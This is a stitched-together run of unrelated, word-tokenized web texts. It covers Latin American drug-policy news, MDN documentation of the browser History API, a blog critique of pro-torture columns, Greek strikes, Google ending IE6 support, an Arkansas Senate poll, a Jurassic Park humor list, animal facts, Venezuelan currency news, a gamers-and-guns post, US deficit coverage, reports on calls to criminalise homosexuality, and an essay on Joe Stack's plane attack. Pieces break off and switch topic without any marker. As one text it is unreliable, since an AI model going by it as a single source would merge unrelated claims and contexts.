And while the INCB also stated its regret that “ influential personalities , including former high - level politicians in countries in South America , have publicly expressed their support for that movement , ” Mr. Tinajero says the debate on reforming drug policies will continue to be robust .
His group just hosted a two - day panel , including former president of Colombia , César Gaviria Trujillo , on reforming the drug strategy in Mexico , which has been dogged by violent drug trafficking that has left over 17,000 dead since Mexican President Felipe Calderón took office and declared war on organized crime .
The former Colombian president is not the only high - level person to support drug reforms .
The former president of Brazil , Fernando Henrique Cardoso , also led a group that published a report urging President Obama to decriminalize marijuana use .

The DOM Window object provides access to the browser 's session history ( not to be confused for WebExtensions history ) through the history object .
It exposes useful methods and properties that let you navigate back and forth through the user 's history , and manipulate the contents of the history stack .
Concepts and usage
Moving backward and forward through the user 's history is done using the back ( ) , forward ( ) , and go ( ) methods .
Moving forward and backward
To move backward through history :
window.history.back ( )
This acts exactly as if the user clicked on the Back button in their browser toolbar .
Similarly , you can move forward ( as if the user clicked the Forward button ) , like this :
window.history.forward ( )
Moving to a specific point in history
You can use the go ( ) method to load a specific page from session history , identified by its relative position to the current page .
( The current page 's relative position is 0 . )
To move back one page ( the equivalent of calling back ( ) ) :
window.history.go(
-1 )
To move forward a page , just like calling forward ( ) :
window.history.go(1 )
Similarly , you can move forward 2 pages by passing 2 , and so forth .
Another use for the go ( ) method is to refresh the current page by either passing 0 , or by invoking it without an argument :
//
The following statements // both have the effect of // refreshing the page window.history.go(0 ) window.history.go ( )
You can determine the number of pages in the history stack by looking at the value of the length property :
let numberOfEntries = window.history .length
Interfaces
History Allows manipulation of the browser session history ( that is , the pages visited in the tab or frame that the current page is loaded in ) .
Examples
The following example assigns a listener to the onpopstate property .
And then illustrates some of the methods of the history object to add , replace , and move within the browser history for the current tab .
window.onpopstate = function ( event ) { alert ( `location : $ {document.location} , state : $ {JSON.stringify( event.state ) }` ) } history .pushState ( {page : 1} , " title 1 " , " ?page=1 " ) history.pushState ( {page : 2} , " title 2 " , " ?page=2 " ) history.replaceState( {page : 3} , " title 3 " , " ?page=3 " ) history .back ( ) // alerts " location : http://example.com/example.html?page=1, state : { " page " : 1} " history .
back ( ) // alerts " location : http://example.com/example.html, state : null " history .
go( 2 ) // alerts " location : http://example.com/example.html?page=3, state : { " page " : 3 } "

If this is The Independent now , as a newspaper supposedly holding up liberal ideals , then it ca n’t get worse under Rod Liddle surely ?
Today , Bruce Anderson starts off by saying :
Torture is revolting .
A man can retain his human dignity in front of a firing squad or on the scaffold : not in a torture chamber .
Torturers set out to break their victim : to take a human being and reduce him to a whimpering wreck .
In so doing , they defile themselves and their society .
There is bound to be a ‘ but ’ here because Anderson is the resident war - mongering neo-con , employed by ( supposed ) liberal - left newspapers who like to think they should be balanced .
Here ’s some excerpts , though feel free to read the whole thing :
We and the Americans have long - established methods of intelligence co-operation , which are now even more important than they were in the Cold War .
It also makes sense to work with other threatened nations , such as Pakistan , where a brave political elite is bearing a disproportionate burden , and receiving few thanks for doing so .
…
Before 9/11 , in front of some serious lawyers , I once argued that if there were a ticking bomb , the Government would not only have a right to use torture .
It would have a duty to use torture .
…
After much agonising , I have come to the conclusion that there is only one answer to Sydney ’s question .
Torture the wife and children .
It is a disgusting idea .
It is almost a tragedy that we even have to discuss it , let alone think of acting upon it .
But there is nothing to be gained from refusing to face facts , in the way that the Master of the Rolls , Lord Neuburger , did last week .
…
There is a threat not only to individual lives , which is of minor importance , but to our way of life and our civilisation .
Torture is revolting , but we cannot substitute aesthetics for thought .
If I wanted this kind of balance I ’d read the bible of wingnut neo-conservatism – FrontPage Magazine .
I thought that kind of crap was only limited to the US , but now we ’re getting it here .
On Sunday , in the Observer , Nick Cohen was having a go at judges for the Binyam Mohammad ruling :
Jonathan Evans , the head of MI5 , added a further complication when he said that the Mohamed ruling provided a propaganda victory for our enemies .
And I am sure he was right .
Nick Cohen has earlier justified torture under certain circumstances .
Now we just need Bruce Anderson to condemn Amnesty International for not upholding human rights and the circle would be complete .
[ hat - tip @ Naomimc ]
Less than 24h after the announcement of the hardest austerity measures in the history of the greek republic , strikes have erupted in the public sector .
Tax - collectors and customs officers have been the first public sector branches to spontaneously react to the government 's austerity measures .
The two public sector branches have gone on a 48h preemptive strike , halting all tax - office transactions and controls as well as freezing import - export activities .
At the same time , the employees of the Ministry of Economics , responsible for imposing the austerity measures , have also gone on a 48h strike , blocking all entrances to the Ministry in Athens .
The spontaneous mobilisations come in a general climate of anger when the call of the Greek Prime Minister for national unity and self - sacrifice has already become the laughing stock in the massively popular morning satirical programs of bourgeois radio stations - amongst the general ridicule of the government televised drama , mock adds in the name of the Industrialist Club declaring that " its time for the poor to pay , the rich have payed enough " are being broadcasted .
Anger is rising after the revelation of details concerning the austerity plan .
These include a 2 year extra work before pension ( from 35 to 37 years in total ) .
The Communist Party ( KKE ) has called workers to " wage a war of counterattack " against the measures , while the Coalition of Radical Left has made the unprecedented move to ask the KKE to forge a front against the measures .
The main opposition party of the Conservatives , kicked out of government last October , has pledged to support the government .
Signaling the extreme - right turn of the party , one of its main MPs even called for the release of the fascist editor arrested two weeks ago during a neonazi attack on an anti-racist demo .
A counter - demo against an anti-immigration demo on Saturday has been called by various anarchist groups .
At the same time , the Ministry of Agriculture has declared it is unable to solve its issue with the farmers , who angered after the Minister managed to slip through their blockade of the Salonica Airport via rural backstreets , moved yesterday to block for several hours all motorway entrances to greece 's second largest city .
Farmer blockades continue to close the way to Bulgaria , was well as many major highways in the north of the country .
It must be noted that the trial of Alexandros Grigoropoulos murderers has been postponed for March when the procedure will begin again from scratch .
At the same time the high court in Salonica has declared the Egyptian fishermen 's strike in Nea Michanonia legal .
Google has announced that Google Docs will drop support for Microsoft 's nearly nine - year - old Internet Explorer 6 ( IE6 ) browser starting on March 1 .
Ironically , if Google had taken its anti-IE6 advice to heart before hackers broke into its corporate network last year , it might not now be mulling whether to abandon the Chinese search market .
" We 're going to begin phasing out our support , starting with Google Docs and Google Sites , " said Rajen Sheth , senior product manager for Google Apps , in a Friday entry on the company 's enterprise blog .
" As a result , you may find that from March 1 key functionality within these products -- as well as new Docs and Sites features -- wo n't work properly in older browsers . "
Google Sites is the search engine 's free Web hosting service .
Google 's new list of supported browsers omits IE6 , as well as other older programs , including Mozilla 's Firefox 2.0 , Apple 's Safari 2.0 and Google 's own Chrome 3.0 .
IE6 is by far the oldest browser of the bunch , with an August 2001 debut .
In comparison , Firefox 2.0 dates to October 2006 , Safari 2.0 to April 2005 and Chrome 3.0 to September 2009 .
People running older browsers should upgrade to a newer version , said Sheth , who posted links to downloads of IE8 , Firefox 3.6 , Safari 4.0 and Chrome 4.0 .
The latter is available in final form only for Windows ; Chrome 4.0 for the Mac is still in beta .
Google 's move is only the latest in a year - long string of major Web properties dropping support for IE6 or urging users to ditch it for something newer .
The campaign began in February 2009 , when Facebook prompted IE6 users to upgrade .
It then accelerated last summer when Google 's YouTube did the same , as Digg announced it would curtail IE6 support and as a California site builder led nearly 40 Web start - ups to urge their users to dump the browser .
An " IE Must Die " petition on Twitter , meanwhile , has accumulated more than 14,000 signatures .
Even Microsoft beat the anti-IE6 drum , although it has also admitted that the job is difficult because the old browser is still mandated by some enterprises .
IE6 also accounts for half the browsers used in China , according to recent data from metrics company NetApplications.com .
Microsoft has promised to support IE6 until April 2014 , when it wraps up all support for Windows XP , the operating system tied to IE6 .
Google 's own use of IE6 allowed hackers to break into its company network late last year and make off with an undisclosed amount of the company 's intellectual property .
The attacks , which used an exploit of a then - unpatched vulnerability in IE6 , showed that Google and dozens of other major Western companies were running Microsoft 's ancient browser .
Google claimed it had proof that the attacks originated in China .
Since then , security researchers have offered clues that appear to confirm Google 's accusation .
According to NetApplications , IE6 use has slid dramatically in the past year .
Last month , the browser accounted for 21 % of the global usage market , down from a 34 % share in December 2008 .

However , things will close as we get closer to the election .
That will be true even for Blanche Lincoln , but does she have much upward mobility ?
PPP
Do you approve or disapprove of Senator Blanche Lincoln ’s job performance ?
Approve .......................................................... 27 %
Disapprove ...................................................... 62 %
Not Sure ..........................................................
11 % Do you have a favorable or unfavorable opinion of Bill Halter ?
Favorable ........................................................ 21 %
Unfavorable .................................................... 29 %
Not Sure .......................................................... 50 % Do you have a favorable or unfavorable opinion of Wesley Clark ?
Favorable ........................................................ 29 %
Unfavorable .................................................... 29 %
Not Sure .......................................................... 42 %
The short answer is a resounding no .
62 % Disapprove of Blanche Lincoln 's performance .
Note that we are comparing Blanche Lincoln 's Approval with the other two 's Favorability .
Those are two different things , so caution should be taken , but since the other two do n't currently have the job , its the closest we can get from this poll .
Wesley Clark is within 15 points of Boozman , showing good numbers .
The important point , however , is to look at all three of their numbers against Boozman and you can see what is happening .
First , we must assume that things will change as time moves on .
Any Democrat will close this gap with Boozman unless they run a horrible campaign .
Second , look at how Boozman 's numbers go down when Halter or Clark are matched against him .
For Clark , with slightly higher name recognition than Halter , he brings him down to 51 % .
For Halter he brings him down to 53 % .
Getting Boozman under 50 % is the first step to winning this thing .
Both Halter and Clark have a pretty good shot at doing this .
Lincoln has him at 56 % , with high name recognition .
He is n't going to move much from there with her as the opponent .
So , who has the ability for the most upward movement ?
It is all about the Undecideds and the " Not Sure " vote .
Lincoln has almost nowhere to go with only 11 % " Not Sure " of her approval rating .
She is stuck at 27 % with little room to grow .
She is a known quantity .
Clark and Halter have the same Unfavorablity rating at 29 % .
This means they are likely hitting the floor of the " I do n't like Democrats " vote .
It is only 29 % in reality .
Note how the 8 % of Arkansans who know Clark ( 42 % Not Sure ) and do n't know Halter ( 50 % Not Sure ) end up giving the Democrat a higher favorability rating Clark ( 29 % favorable ) .
What this may show , is that the more people know about Democratic candidates not named Blanche Lincoln , the more they like them .
With so much room to grow , both Halter ( 50 % ) and Clark ( 42 % ) have a good shot at saving this seat for the Democrats with a good campaign .
The poll tends to concentrate on how Democrats in general are doomed , but I disagree , as will a lot of people in this state .
It just does n't jive with the politics of the state .
I think the 29 % unfavorability of both Halter and Clark and the 22 % unfavorability of Governor Mike Beebe show who are really the anti-any - Democrat voters .
They are a small number that likely would vote against Democrats regardless of the political situation .
Also notice how this poll only gives Beebe a 59 % approval rating while he has above 80 % in other polls .
Do not read this poll to mean Democrats can't win the Senate seat in November .
Read it as , if we have any chance , we need to get a fresh face up against Boozman .
I think those of us trying to Draft Bill Halter need to step it up .
Please help us Draft Bill Halter .
Update :
http://bluearkansasblog.com/...
Rasmussen released another poll today showing Blanche Lincoln loosing to all Republicans by double digits .
It is interesting how the usually Republican leaning Rasmussen even has Lincoln fairing better than the PPP poll released today .
She loses to Boozman by 19 points instead of 23 points .
Also , possibly showing bias in the PPP poll , Beebe gets 73 % approval instead of the 59 % in the PPP poll .
Gilbert Baker does just as well against Lincoln , beating her by 19 points .
Other Republicans also beat her , but their leads are closer to 15 points .

Andrew from Akron asks :
My Dear Wolf Nards ,
I ’ve always been bugged by the ending of Jurassic Park , how did the T - Rex get into the discovery center ?
I ’ve looked at it from every angle and there was n’t a door big enough for a tyrannosaurus .
When we first saw Jurassic Park and the T - Rex came out of no where to kill the Velociraptor at the end , we all thought the same thing … awesome .
It was just that , not much more thought went into it .
Upon a thousand viewings later though questions like these start to crop up .
Interestingly , this was n’t the original ending of the film .
The original draft of the script had Alan Grant fighting off the raptors with a mechanized tyrannosaurus skeleton .
Spielberg deemed that ending too unbelievable and very a good call on his part .
We all like to poke holes in great movies , this site is based on nothing but that , and Jurassic Park in no exception .
Cracked had a similar dilemma with the the ending of Jurassic Park , their beef being that suddenly in the waning moments of the film T - Rex miraculously becomes a silent ninja .
But not only does the T - Rex need to become a silent killer , but it needs to get into the guest center first .
We ’re dealing with a 20 ft high tyrannosaurus and a 7 ft door .
Either it destroys the door trying to get in or gets its head stuck trying .
Here are just a few of the most likely scenarios :
Through a Window
The Tyrannosaurus Rex could have crashed through any number of glass windows .
The Discovery Center looks like it ’s 80 % glass .
Plus there ’s a good chance that either John Hammond or Newman had a pie cooling on the windowsill at the time .
Dinosaur Shaped Door or Hole
The Jurassic Park Discovery Center is a pretty big building with presumably some sort of loading dock and doors big enough to fit any number of dinosaurs .
T - Rex just needs to go through the loading dock , through the warehouse , up an elevator , past the office staff cubicles , past the vending machines , down some stairs , through the tourist displays , and BAM at the front door .
Like a Rat
And it may not even need to be a big hole to crawl though .
Rats can fit through holes the size of quarters , perhaps a particularly nibble and flexible Tyrannosaurus Rex can fit through a hole the size of a basketball .
Not knowing their exact physiology in nature limits what we can expect them to do .
So , next time you hear something scratching around in the walls , it just may be a T - Rex .
The T - Rex was Always There
It was one of the hatched eggs from the beginning of the movie .
It hatched , lived , and grew over the course of the two days .
It did n’t need to sneak into the guest center because it was always in the guest center .
It ’s like that urban legend :
The call from the T - Rex is coming from inside the house .
Through the Pipes
A facility with all the major problems of a theme park and a zoo probably has one hell of a sewer system .
The Tyrannosaurus could have made its way through the underground pipes just like Mario .
A Dig Dug analogy can also work .
And if it could n’t go under , perhaps it could go over …
Flew Over Center by Jet Plane
T - Rex has a need , a need for speed .
And after flying the jet over the Discovery Center , the T - Rex will consequentially …
Parachuted In
A hang glider or da Vinci plane could also work in a pinch .
Tyrannosaurus Teleported Inside
T - Rex either used a Star Trek teleporter pad or it had a latent mutant ability like Nightcrawler .
Think of it less of dinosaur or more of a mutant frog .
All it needs to do is separate its molecules one at a time and resemble them on the other side of the wall .
Through the Looking Glass
Why teleport when a convenient worm hole is readily available ?
T - Rex obviously made it in the same way Alice made it to Wonderland .
It does n’t have to just be a magic mirror either , any kind of worm hole or space / time anomalies will do .
Shrink Ray
If Rick Moranis is not available ( and who are we kidding … he ’s available ) , a “ drink me ” bottle from an early visit from Wonderland would do .
A shrunken T - Rex could easily waltz right in , the only problem is finding some sort of re-bigulator on the other side .
The Power of Christ
All you need is a little faith in the Tyrannosaurus Rex .
Jeff Goldblum Did It
I do n’t know how he did it , but somehow , someway Jeff Goldblum was involved in getting that T - Rex through the door .
Goldblum represents the finest in movie scientist , and let ’s not forget he once even managed to hack alien technology .
If anyone can figure out how to get a 20 ft dinosaur through a 7 ft door , it ’s Jeff Goldblum .
Instead of thinking of the T - Rex saving Grant , the kids , and Laura Dern ( and her short shorts ) , you can think of Jeff Goldblum saving them .
He picked that raptor up in his powerful Jeff Goldblum jaws just in the nick of time .
Fastest Animal on Land …
CHEETAH
The cheetah is an atypical member of the cat family that is unique in its speed , while lacking climbing abilities .
The species is the only living member of the genus Acinonyx .
It is the fastest land animal , reaching speeds between 112 and 120 km/h ( 70 and 75 mph ) in short bursts covering distances up to 460 m ( 1,500 ft ) , and has the ability to accelerate from 0 to 103 km/h ( 64 mph ) in three seconds , faster than most supercars .
Recent studies confirm the cheetah ’s status as the fastest land animal .
Why would a cheetah need to be able to run so fast ?
The only animal that comes in a close second to the Cheetah ’s amazing speed is its favorite prey , the gazelle .
In order to catch up with a meal that ’s as swift as the wind , the cheetah had to develop the ability to run as fast , or faster than the gazelle , or face the alternative – starvation .
Pretty strong motivation for practicing their wind sprints .
Heaviest Animal on Land …
AFRICAN ELEPHANTS
African elephants are the largest land animals on Earth .
They are slightly larger than their Asian cousins and can be identified by their larger ears that look somewhat like the continent of Africa .
Elephant ears radiate heat to help keep these large animals cool , but sometimes the African heat is too much .
Elephants are fond of water and enjoy showering by sucking water into their trunks and spraying it all over themselves .
Afterwards , they often spray their skin with a protective coating of dust .
An elephant ’s trunk is actually a long nose used for smelling , breathing , trumpeting , drinking , and also for grabbing things — especially a potential meal .
The trunk alone contains about 100,000 different muscles .
African elephants have two fingerlike features on the end of their trunk that they can use to grab small items .
Both male and female African elephants have tusks they use to dig for food and water and strip bark from trees .
Males use the tusks to battle one another , but the ivory has also attracted violence of a far more dangerous sort .
Because ivory is so valuable to some humans , many elephants have been killed for their tusks .
This trade is illegal today , but it has not been completely eliminated , and some African elephant populations remain endangered .
Elephants eat roots , grasses , fruit , and bark , and they eat a lot of these things .
An adult elephant can consume up to 300 pounds ( 136 kilograms ) of food in a single day .
These hungry animals do not sleep much , and they roam over great distances while foraging for the large quantities of food that they require to sustain their massive bodies .
Female elephants ( cows ) live in family herds with their young , but adult males ( bulls ) tend to roam on their own .
Having a baby elephant is a serious commitment .
Elephants have a longer pregnancy than any other mammal — almost 22 months .
Cows usually give birth to one calf every two to four years .
At birth , elephants already weigh some 200 pounds ( 91 kilograms ) and stand about 3 feet ( 1 meter ) tall .
Best Jumper Animal …
CAT FLEA
Did you know a flea can jump 33 cm. in one leap – over a foot ?
You ’ve seen them – tiny , quick creatures that scurry through your cat ’s fur , feasting on her blood , and causing painful itching – so bad that kitty may scratch herself raw in seeking relief .
If you have a bad flea infestation in a multiple - cat household , you ’ve probably been bitten yourself by these voracious feeders , and you may even have seen them hopping through your carpeting .
Best Flyer …
HUMMINGBIRDS
Hummingbirds are birds comprising the family Trochilidae .
They are among the smallest of birds , and include the smallest extant bird species , the Bee Hummingbirds .
They can hover in mid-air by rapidly flapping their wings 12–90 times per second ( depending on the species ) .
They can also fly backwards , and are the only group of birds able to do so .
Their English name derives from the characteristic hum made by their rapid wing beats .
They can fly at speeds exceeding 15 m/s ( 54 km/h , 34 mi/h ) .
Largest Animal on Land …
BLUE WHALE
The blue whale is the largest mammal , possibly the largest animal , to ever inhabit the earth .
Its body is long , somewhat tapered , and streamlined , with the head making up less than one - fourth of its total body length .
Its rostrum ( upper part of the head ) is very broad and flat and almost U - shaped , with a single ridge that extends just forward of the blowholes to the tip of the snout .
Its blowholes are contained in a large , raised “ splash guard ” , and the blow is tall and straight and over 20 feet ( 6 meters ) high .
Its body is smooth and relatively free of parasites , but a few barnacles attach themselves to the edge of the fluke and occasionally to the tips of the flippers and to the dorsal fin .
There are 55 - 68 ventral grooves or pleats extending from the lower jaw to near the navel .
Venezuelans have rushed to the shops to buy imported luxury goods Venezuela 's President , Hugo Chavez , has said troops will seize control of any business that raise prices in response to the devaluation of its currency .
He said there was no reason for prices to go up , and speculators ' businesses would be handed over to the workers .
Venezuelans have rushed to the shops to buy imported goods before the bolivar 's devaluation comes into effect .
Mr Chavez says devaluing the bolivar by at least 17 % will boost competitiveness and reduce dependence on imports .
But critics say it will fuel inflation , which has already risen to 25 % .
' Pickpockets '
The bolivar 's official exchange rate , which is set by government decree , had been held steady at 2.15 to the US dollar since the last devaluation in March 2005 .
But on Friday , President Chavez announced that it would now have two rates - 2.60 to dollar for " priority " imports , and 4.30 to the dollar for other items considered non-essential - a 50 % devaluation .
I want the National Guard to hit the streets with the people to fight against speculation and take measures
Venezuelan President Hugo Chavez ,
He said that the two rates would have the effect of " limiting imports that are not strictly necessary and stimulating export policy " .
Oscar Meza , director of the Venezuelan economic think tank , Cendas , predicted the move would push annual inflation above 33 % .
" It 's impossible for prices not to be adjusted , " he told the Associated Press .
" If they are n't adjusted , they 'll disappear . "
Mr Chavez dismissed the criticism on Sunday on his weekly television and radio programme , Alo Presidente , saying there was " no reason for anybody to be raising prices " .
He urged his supporters to " publicly denounce the speculator " and warned business owners that he had asked the military to formulate an " offensive plan " that would see them " take over any business , of any size , that plays the bourgeois speculation game " .
" I want the National Guard to hit the streets with the people to fight against speculation and take measures , " he said , without specifying .
Luis Ignacio Planas of the opposition Copei party said the government was " acting like a pickpocket , sticking its hands in the pockets of Venezuelans , taking their money to continue financing and paying for an irresponsible economic policy " .

Many gun enthusiasts complain how amateurs believe that they know about firearms due to playing videogames like Modern Warfare 2 , which feature real guns .
The owner of the gun site , The Firearm Blog , was surprised to realize that the most popular search term that led to his site was an obscure gun unknown outside the firearm industry , the Bushmaster ACR .
That was until he realized that the gun was featured in Modern Warfare 2 .
" I was surprised because , compared to the AKs , M4s and Glocks of the world , the ACR is relatively unknown outside of the industry , " the blog 's owner , Steve , wrote on December 8th , 2009 .
" Have any other bloggers noticed the Call of Duty effect ? "
There follows a stream of anecdotes from gun enthusiasts about how videogames have turned gamers into " gun experts . "
" I was riding around with a friend of mine when I asked him to stop in at this new gun shop , " said one commenter , Robert .
" He knows next to nothing about guns so I was surprised when he asked , ' Can you buy an ACR in there ? '
After explaining they do n't sell it to regular people I asked him where the hell he had heard of it ... should 've known before asking .
He 's an avid gamer . "
Another funny story is told by Jim :
I would n't call it the Call of Duty effect as much as the Halo effect .
He came in to a Pawn Shop I was shopping around at and asked for an " Ess Em Gee " ( Submachine gun ) .
The owner said that he did n't carry them .
He then asked if he had any sniper rifles .
The owner showed him a .270 ( I believe ) .
As the punk ( hat cocked off to the side and his pants at a level where a belt would not allow them to fall ) looked down the scope , he asked how to " zoom it " ( a common feature of scoped rifles in video games ) .
The owner showed him how to magnify and clarify the image .
The punk said that he was just used to the rifle doing that for him .
Finally the owner asked what the kid was looking for to which he replied " I just want to headshot some noobs !
Like in Halo ! "
The conversation quickly degraded from that moment and ended very shortly .

Elected Republicans , however , are under intense pressure from their party ’s conservative base to oppose any tax increases  a line in the sand that dims any prospects for bipartisan cooperation .
Yet economists , including veterans of past Republican administrations , are vocal in insisting that the debt problem is too great to be solved without increasing revenues somehow and perhaps moving to a new consumption tax system like Europe’s .
The same economists also say a significant deficit - reduction plan is not possible unless Mr. Obama breaks his campaign promise not to raise taxes for households making less than $ 250,000 .
Last week , Mr. Obama said he would not impose that condition or any other on a fiscal commission .
The situation is complicated by a debate over how quickly Washington should act even if it could .
The Obama administration , Congressional Democratic leaders and many economists are pushing for additional government stimulus measures while the private sector remains weak .
But anger about big deficits has stoked the populism roiling politics , and Republicans as well as some conservative Democrats want to cut spending right now as a way of addressing perceptions among voters that government has gotten too big , too intrusive and too profligate .
Mr. Obama himself proposed a budget that would freeze spending on some categories of domestic spending for three years .
Many analysts say the president and Congress could send a strong signal to global markets by agreeing this year to a package of both long - term tax increases and spending reductions , especially in the popular entitlement programs , that would not take effect until 2012 .
That is the recommendation of two new studies , one by the National Research Council and the National Academy of Public Administration and the other a separate joint project of the Peter G. Peterson Foundation , the Pew Charitable Trusts and the Committee for a Responsible Federal Budget .
Image Senators Evan Bayh and John McCain , right , on Jan. 26 as they discussed proposed legislation to halt discretionary spending .

As debt rises , so do interest costs ; by 2014 , at a projected $ 516 billion , they will exceed the budget for annual appropriations for domestic programs .
The government will be competing with the private sector for credit , forcing interest rates higher and imperiling future prosperity .
Foreign investors now own more than half of the publicly held debt , and officials for the largest creditor , China , have fretted publicly about the fiscal course of the United States .
While few expect foreigners to dump their assets , since the resulting plunge in values would hurt them as well as everyone else , the fear is that investors will demand higher interest payments and reduce or stop future debt purchases , threatening the government ’s ability to finance its borrowing .
For the third time in the last week , a leading Religious Right activist has declared that his goal is to see homosexuality criminalized .
First it was Bryan Fischer of the American Family Association and Peter Sprigg of the Family Research Council who made such declarations and now Gary Glenn of the AFA of Michigan has joined the call as well :
Gary Glenn , president of the American Family Association of Michigan , has added his voice to a growing course of American leaders calling for the re-criminalization of homosexuality in the U.S.
In an e-mail to Michigan Messenger , here ’s how Glenn responded when asked if he supported the criminalization move proposed by the Family Research Council ’s Peter Sprigg ’s comments last week on Hardball : “ The short answer to your question is yes , we believe that states should be free to regulate and prohibit behavior that ’s a violation of community standards and a proven threat to public health and safety — including , as most of the United States did throughout its history , homosexual behavior . ”
It should also be pointed out that Glenn is among the plantiffs in the Thomas More Law Center ’s lawsuit challenging the Hate Crimes Prevention
Act of 2009 on the grounds that protection for gays is part of an effort to “ criminalize the Bible and use the threat of federal prosecutions and long jail sentences to silence Christians from expressing their Biblically - based religious belief that homosexual conduct is a sin . ”
Few of us can easily surrender our belief that society must somehow make sense .
The thought that the state has lost its mind and is punishing so many innocent people is intolerable .
And so the evidence has to be internally denied .
~ Arthur Miller
The recent suicide attack made by a man who crashed his plane into a Texas building housing IRS offices raises questions that neither the mainstream media nor other establishment voices will dare to examine .
Such a frontal assault on the state — like suicide bombers in the Middle East — must not be seen as an indictment of political systems .
The media will go into its obligatory " damage control " mode and marginalize the man — Joe Stack — as a " kook , " a " terrorist , " or an " extremist , " another threat whose example can be turned to the benefit of the state .
His lengthy , but inelegant , written statement explaining his anger at the government was quickly labeled a " diatribe , " a " rant , " and a " rambling screed , " to discourage others from reading his words and having their thinking infected thereby .
Far safer to have this man thought of as " insane , " for what rational person would want to give his writing serious attention ?
There is a sadness within events such as this , reflective of an individual inner awareness that the social systems with which we have organized with one another simply do not serve their avowed purposes .
Governments do not defend our liberty and protect our property , but increasingly control and despoil us ; schools do not fire our children ’s creative imaginations and capacities for independent questioning , but carefully condition their minds to accept assigned roles in an institutionally - structured world ; as they increase in size , business organizations cease functioning as convenient tools for sharing in the division of labor that makes our material well - being possible , and become icons that are " too big to fail , " and are thus entitled to be sustained at the forced expense of ordinary people .
In Restraint of Trade : ... Butler Shaffer , Butler ... Check Amazon for Pricing .
Our institutionally - dominated world , in other words , is a structured monolith that no more serves the living than does a packinghouse serve the cattle who are consumed therein .
Wars , police brutalities , assassinations , torture , the use of eminent domain to transfer property to corporations , asset forfeiture , the subjugation of the human spirit , the corporate purposes for which the state exists , these and so many other examples of the continuing war against life that is our modern society , increasingly remind us that we humans are but fungible resources to be exploited on behalf of well - organized interests not of our own direction .
The sadness in this man ’s suicide attack is enhanced by two interconnected factors : ( 1 ) that his anger and frustration at a system that so thoroughly exploited — rather than supported — him , reduced his response to a life - destroying act of utter desperation ; and ( 2 ) that our own lives have become so fragmented from one another that we are unable to see our common interest in defending one another from these forces of organized victimization .
Like so many people who have been battered into submission by more powerful bullies , there is a tendency for victims to internalize the wrong as a personal shortcoming .
As our social and political thinking has evolved from milder to more severe levels of lunacy ( e.g. , from wars of supposed " self - defense " to " preventive " wars ) our collective madness has escalated from the normally - neurotic to the commonplace psychotic .
We learn to absorb the deranged reasoning that insists upon the increased costs to our humanness .

Perhaps the saddest words of all in Mr. Stack ’s statement are these : " violence not only is the answer , it is the only answer . "
Such a thought probably accompanied the Ohio man who recently bulldozed his own house when faced with foreclosure proceedings .
The same mindset — while not spoken — undoubtedly underlies the actions of those who shoot others at shopping malls , schools , or their workplaces .
The shallow - minded will attribute such acts to guns or other tools of destruction .
Resort to violence has always reflected a sense of hopelessness , despair , and despondency so contrary to life .
Because the state is defined as a system that enjoys a monopoly on the use of violence , it becomes easy for any of us — frustrated and angry over having our wills systematically violated by coercive agencies — to feel the need , at some point , to respond in kind .
But if violence practiced by governments is antithetical to life , does n’t a violent act of retaliation likewise diminish the quality of life ?
It is not the unlawfulness , or the immorality of such acts that is so saddening , but the dispiriting impact it has on the actor ; what it does to the soul of the person driven to such desperate measures .
By resorting to statist tactics , we internalize statism ; we become what we oppose .

I have always been less interested in the philosophic foundations of peace and liberty than in the psychology — the state of mind — that is necessary to bring about such conditions .
It is not the rest of the world ; the politicians and other collectivists ; the media ; " they " that are so in need of reformation , but our individual selves .
Shakespeare expressed the point so clearly in Julius Caesar : " The fault , dear Brutus , is not in our stars , but in ourselves , that we are underlings . "
All of the anger that we feel is self - directed , even when we are reacting to what others have done to us .
This is not to absolve the wrongdoer , but to focus our attention on the more important question : what personal shortcomings led to my being victimized ?
A student once asked me : " but if you were walking alone down a dark , uninhabited street at night , and were approached by a gang of muggers , what would you do ? "
I answered that my response would depend upon the options available to me at the time but , I added , " when I got back home , I would ask myself : u2018 why on earth was I walking alone down a dark , uninhabited street at night ?’. "

We are uncomfortable contemplating our own imperfections or , worse yet , those " dark - side " voices within our unconscious mind that speak of qualities we would prefer not to have ( e.g. , anger , capacities for violence , etc . )
Though most of us do not act upon these feared elements , we are troubled that they are within us .
How do we get rid of them ?
All too often we project such attributes onto others ( i.e. , " scapegoats " ) .
As an expression of our identification with a political system bent on controlling the world , we easily ascribe such motivations to others : ( e.g. , Hitler , the communists , and , now , militant Islam ) .
It is important to point out that a scapegoat — whether foreign or domestic — need not be innocent of any wrongdoing .
Whether we are engaging in scapegoating can largely be sensed by the anger we feel toward another .
If a serial killer was loose in our community , we might respond in a fairly rational way , taking steps to protect our family and friends from possible attack .
Such behavior — born of a rational fear — would not rise to the level of projecting our felt shortcomings onto another .
On the other hand , if our response was fired by an intense rage , we might well be expressing anger at ourselves for feeling vulnerable to the attacks of another .
How much of the anger we experience from state action is really an indictment of our inability to avoid being looted , regulated , bullied , and dehumanized by this system ?
The Greek Stoic , Epictetus , observed : " It is impossible for that which is free by nature to be disturbed by anything but itself .
It is a man ’s own judgments which disturb him . "
If we have a sense of existential worthiness ( i.e. , our own reason for being ) , and the expectation that others in society will respect our inviolability , how will we respond when such expectancies fail us ?
As popular respect and sanction for the state continues to erode , political authorities react with increasingly draconian measures to shore up a fading obedience , a process that only intensifies the disrespect and anger felt by so many .
Many men and women — mindful that the trust they had been conditioned to give to the political system was unwarranted — strike out in self - destructive anger .
Joe Stack ’s act of enraged desperation was the latest , but will not be the last , example .
But is there a peaceful means — one that does not emulate the violence of a system that has failed them — of restoring a sense of humanity to a society already politicized far beyond the fears of the founders of this country ?
Just one of the many victims of the collapse of long - held popular expectations of the American system , has been the idea of " constitutional government . "
The notion that state power could be restrained by words written on parchment , has been thoroughly discredited in recent years .
The state — which enjoys the authority to interpret its own powers — has been enjoying a holiday free of any limitations other than its own appetites .
Joe Stack ’s belief that " violence is the only answer " to such depredations would only enshrine destruction — whether engaged in by the state or by those seeking liberty — as a way of living .
It is what such a mindset would do to us , to our children , and grandchildren , that ought to set us against violence .
Arthur Koestler may have been right when he suggested that humanity may have been an evolutionary mistake ; that imbuing a killer ape with intelligence might not have been one of nature ’s better strategies !
If you like this site , please help keep it going and growing .
Whether it is too late to salvage mankind from its self - destructive bent I can not say .
But for the sake of my children and grandchildren , I am not prepared to give up on the evolutionary process ; I have no interest in engaging in futile , self - destructive suicide runs at statist windmills .
Instead , I shall continue in my efforts to outsmart those who insist on keeping my fellow humans penned up for their fate inside the institutional abattoir !
I was reminded of one such effort as I learned of Joe Stack ’s response to his own frustration .
